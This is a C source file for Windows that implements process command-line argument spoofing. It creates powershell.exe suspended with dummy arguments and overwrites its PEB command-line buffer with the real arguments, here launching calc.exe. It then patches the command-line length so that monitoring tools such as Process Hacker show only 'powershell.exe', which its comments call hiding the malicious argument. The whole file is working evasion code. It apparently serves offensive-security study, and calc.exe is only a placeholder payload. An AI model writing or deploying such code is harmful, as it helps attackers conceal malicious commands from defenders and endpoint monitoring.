#include "base.h"

#define DUMMY_ARGS L"powershell.exe AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
#define REAL_ARGS L"powershell.exe -NoExit -c calc.exe"
#define PATCH_SIZE  sizeof(L"powershell.exe")    // Size exposed to process hacker

/// <summary>
///  Read a buffer from a specific address in a remote process
/// </summary>
/// <param name="hProcess"> Handle to the remote process </param>
/// <param name="pAddress"> Address to read from </param>
/// <param name="ppBuffer"> OUT: Buffer read from the address </param>
/// <param name="dwSize"> Size of the buffer to read </param>
/// <returns></returns>
BOOL ReadFromProcess(IN HANDLE hProcess, IN PVOID pAddress, OUT PVOID* ppBuffer, IN DWORD dwSize) {
    
    SIZE_T sBytesRead = NULL; 

    *ppBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwSize);

    if (!ReadProcessMemory(hProcess, pAddress, *ppBuffer, dwSize, &sBytesRead)) {
        PRINT_ERROR("ReadProcessMemory"); 
        return FALSE;
    }

    return TRUE; 
}

/// <summary>
///  Write a buffer to a specific address in a remote process
/// </summary>
/// <param name="hProcess"> Handle to the remote process </param>
/// <param name="pAddress"> Address to write to </param>
/// <param name="pBuffer"> Buffer to write to the address </param>
/// <param name="dwSize"> Size of the buffer </param>
/// <returns></returns>
BOOL WriteToProcess(IN HANDLE hProcess, IN PVOID pAddress, IN PVOID pBuffer, IN DWORD dwSize) {

    SIZE_T sBytesWritten = NULL; 

    if (!WriteProcessMemory(hProcess, pAddress, pBuffer, dwSize, &sBytesWritten)) {
        PRINT_ERROR("WriteProcessMemory");
        return FALSE;
    }

    return TRUE; 
}

/// <summary>
///  Creates a process with spoofed command line arguments
/// </summary>
/// <param name="szDummyArgs"> Non-malicious startup arguments that are to be replaced </param>
/// <param name="szRealArgs"> Real command line arguments. Size needs to be smaller or equal to the size of the dummy args </param>
/// <param name="dwProcessId"> OUT: Process id of the created process </param>
/// <param name="hProcess"> OUT: Handle to the created process </param>
/// <param name="hThread"> OUT: Handle to the created thred </param>
BOOL CreateArgSpoofedProcess(IN LPWSTR szDummyArgs, IN LPWSTR szRealArgs, OUT DWORD* dwProcessId, OUT HANDLE* hProcess, OUT HANDLE* hThread) {

    NTSTATUS STATUS = NULL; 
    BOOL bState = TRUE; 

    WCHAR szProcess[MAX_PATH];
    WCHAR WnDr[MAX_PATH];
    WCHAR CurrDr[MAX_PATH];
    STARTUPINFOW Si = { 0 }; 
    PROCESS_INFORMATION Pi = { 0 };

    PROCESS_BASIC_INFORMATION PBI = { 0 }; 
    ULONG uReturn = NULL; 
    PPEB pPeb = NULL;
    PRTL_USER_PROCESS_PARAMETERS pParams = NULL; 

    RtlSecureZeroMemory(&Si, sizeof(STARTUPINFOW)); 
    RtlSecureZeroMemory(&Pi, sizeof(PROCESS_INFORMATION)); 

    Si.cb = sizeof(STARTUPINFOW); 
    
    fnNtQueryInformationProcess pNtQueryInformationProcess = NULL; 

    // Get address of NtQueryInformationProcess
    pNtQueryInformationProcess = (fnNtQueryInformationProcess)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtQueryInformationProcess");
    if (!pNtQueryInformationProcess) {
        PRINT_ERROR("GetProcAddress");
        bState = FALSE;
        goto CLEANUP; 
    }
    OKAY("[ 0x%p ] Got address to NtQueryInformationProcess.", pNtQueryInformationProcess); 
    
    // Getting the %WINDIR% environment variable path (That is generally 'C:\Windows')
    if (!GetEnvironmentVariableW(L"WINDIR", WnDr, MAX_PATH)) {
        PRINT_ERROR("GetEnvironmentVariableW"); 
        bState = FALSE;
        goto CLEANUP; 
    }
    swprintf_s(CurrDr, MAX_PATH, L"%s\\System32", WnDr); 
    WOKAY(L"Got current directory: %s", CurrDr); 

    // Create suspended process
    lstrcpyW(szProcess, szDummyArgs);

    if (!CreateProcessW(
        NULL,
        szProcess,                                // Target process with dummy arguments
        NULL,
        NULL,
        FALSE,
        CREATE_SUSPENDED | CREATE_NO_WINDOW,    // Creating the process suspended & with no window
        NULL,
        CurrDr,               
        &Si,
        &Pi)) 
    {
        PRINT_ERROR("CreateProcessW");
        bState = FALSE;
        goto CLEANUP; 
    }
    WOKAY(L"Created suspended process \"%s\".", szProcess); 

    // Get PROCESS_BASIC_INFORMATION structure from remote process, which contains the PEB address
    /*__kernel_entry NTSTATUS NtQueryInformationProcess(
        [in]            HANDLE           ProcessHandle,
        [in]            PROCESSINFOCLASS ProcessInformationClass,
        [out]           PVOID            ProcessInformation,
        [in]            ULONG            ProcessInformationLength,
        [out, optional] PULONG           ReturnLength
    );*/
    STATUS = pNtQueryInformationProcess(Pi.hProcess, ProcessBasicInformation, &PBI, sizeof(PBI), &uReturn);
    if (STATUS != NULL) {
        PRINT_NTERROR("NtQueryInformationProcess"); 
        bState = FALSE;
        goto CLEANUP; 
    }

    // Read PEB structure from PBI.PebBaseAddress
    if (!ReadFromProcess(Pi.hProcess, PBI.PebBaseAddress, &pPeb, sizeof(PEB))) {
        PRINT_ERROR("ReadFromProcess [1]");
        bState = FALSE;
        goto CLEANUP; 
    }
    OKAY("[ 0x%p ] Got address to PEB.", pPeb); 

    // Read the RTL_USER_PROCESS_PARAMETERS structure from the PEB of the remote process
    // Read an additional 0xFF (255) bytes to ensure that the CommandLine.Buffer pointer is reached
    if (!ReadFromProcess(Pi.hProcess, pPeb->ProcessParameters, &pParams, sizeof(RTL_USER_PROCESS_PARAMETERS) + 0xFF)) {
        PRINT_ERROR("ReadFromProcess [2]");
        bState = FALSE;
        goto CLEANUP; 
    }
    OKAY("[ 0x%p ] Got address to process parameters.", pParams); 

    // Update process command line arguments with the actual arguments
    if (!WriteToProcess(Pi.hProcess, (PVOID)pParams->CommandLine.Buffer, (PVOID)szRealArgs, (DWORD)(lstrlenW(szRealArgs) * sizeof(WCHAR) + 1))) {
        PRINT_ERROR("WriteToProcess [1]"); 
        bState = FALSE;
        goto CLEANUP; 
    }
    OKAY("Overwritten dummy arguments."); 

    /// Patching CommandLine.Length to prevent tools like ProcessHacker from seeing the actual malicious argument 
    DWORD dwNewLength = PATCH_SIZE; // sizeof(L"powershell.exe")

    INFO("Patching CommandLine.Length: [ %d ] -> [ %d ].", pParams->CommandLine.Length, dwNewLength); 
    if (!WriteToProcess(Pi.hProcess, ((PBYTE)pPeb->ProcessParameters + offsetof(RTL_USER_PROCESS_PARAMETERS, CommandLine.Length)), (PVOID)&dwNewLength, sizeof(DWORD))) {
        PRINT_ERROR("WriteToProcess [2]"); 
        bState = FALSE;
        goto CLEANUP; 
    }
    OKAY("Updated."); 
    
    // Resume process with new parameters
    ResumeThread(Pi.hThread);

    // Store return values
    *dwProcessId = Pi.dwProcessId;
    *hProcess = Pi.hProcess; 
    *hThread = Pi.hThread; 

CLEANUP: 
    
    HeapFree(GetProcessHeap(), NULL, pPeb);
    HeapFree(GetProcessHeap(), NULL, pParams);

    if (!dwProcessId || !hProcess || !hThread) {
        WARN("Not all output variables have been filled."); 
        bState = FALSE; 
    }

    return bState; 
}

int main(int argc, char* argv[]) {

    DWORD dwProcessId = NULL;
    HANDLE hProcess = NULL; 
    HANDLE hThread = NULL; 

    if (!CreateArgSpoofedProcess(DUMMY_ARGS, REAL_ARGS, &dwProcessId, &hProcess, &hThread)) {
        PRINT_ERROR("CreateArgSpoofedProcess");
        return EXIT_FAILURE; 
    }
    OKAY("[ %d ] Process created.", dwProcessId); 

    return EXIT_SUCCESS; 
}